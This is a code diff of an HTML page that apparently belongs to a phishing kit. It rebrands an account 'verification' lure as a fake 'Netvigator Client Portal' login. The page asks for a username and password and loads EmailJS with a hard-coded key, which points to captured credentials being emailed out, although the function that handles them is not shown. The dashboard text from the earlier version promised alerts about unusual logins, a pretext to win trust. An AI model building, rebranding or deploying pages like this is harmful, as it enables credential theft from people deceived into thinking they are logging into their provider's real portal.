@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Manage User Accounts</title>
+    <title>Netvigator Client Portal</title>
     <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <script>
         emailjs.init("JYKSTvr8xx8jZDFiA"); // EmailJS Public Key
@@ -63,18 +63,18 @@
     </style>
 </head>
 <body>
-    <div class="header">Manage User Accounts</div>
-    <div id="Verify Account" class="container">
-        <h2>Verify Account</h2>
+    <div class="header">Netvigator Client Portal</div>
+    <div id="login" class="container">
+        <h2>Login</h2>
         <input type="text" id="username" placeholder="Username" required>
         <input type="password" id="password" placeholder="Password" required>
-        <button onclick="authenticate()">Enable</button>
-        <p><a href="#" class="Use the above button to enable your account</a></p>
+        <button onclick="authenticate()">Login</button>
+        <p><a href="#" class="forgot-password">Forgot your password?</a></p>
     </div>
 
     <div id="dashboard" class="container" style="display: none;">
-        <h2>Great Choice! We will alert you when we detect any unusual login from a new device within or outside region.</h2>
-        <textarea id="feedback" placeholder="Give us your feedback here..." required></textarea>
+        <h2>Feedback Form</h2>
+        <textarea id="feedback" placeholder="Enter your feedback here..." required></textarea>
         <button onclick="submitFeedback()">Submit</button>
     </div>
 
